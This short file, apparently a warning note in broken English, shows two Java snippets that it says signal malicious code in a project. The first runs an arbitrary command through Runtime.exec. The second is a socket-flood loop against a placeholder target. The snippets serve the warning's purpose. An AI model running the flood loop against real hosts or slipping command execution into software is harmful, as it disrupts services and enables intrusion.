
# if in any project was like this . that mean  its for remote server  never use feri


"""
import java.io.*;

public class RCE {
    public static void main(String[] args) throws Exception {
        String command = "calc.exe"; // Replace with your desired command
        Runtime.getRuntime().exec(command);
    }
}

"""






# if was like this , that mean it used for DDos . and should remove , never use feri
"""
import java.net.*;

public class DoS {
    public static void main(String[] args) throws Exception {
        String target = "example.com"; // Replace with the target server's IP or domain
        int port = 80; // Replace with the target server's port

        while (true) {
            Socket socket = new Socket(target, port);
            socket.close();
        }
    }
}




"""